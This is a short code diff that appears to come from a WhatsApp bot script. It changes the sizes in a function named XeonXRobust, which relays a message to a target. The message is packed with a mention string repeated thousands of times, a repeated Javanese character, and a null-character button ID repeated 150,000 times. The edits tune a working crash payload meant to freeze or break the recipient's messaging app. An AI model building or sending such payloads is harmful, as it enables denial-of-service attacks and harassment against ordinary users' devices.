@@ -379,7 +379,7 @@ const wanted = {
 		
 		    async function XeonXRobust(target, o, Ptcp = true) {
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(1500);
+	const ui = 'ꦽ'.repeat(70000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
@@ -498,7 +498,7 @@ quotedMessage: {
                     footerText: "🦄드림 가이 Xeon",
                     buttons: [
                         {
-                            buttonId: "\u0000".repeat(200000),
+                            buttonId: "\u0000".repeat(150000),
                             buttonText: {
                                 displayText: "🦄드림 가이 Xeon"
                             },
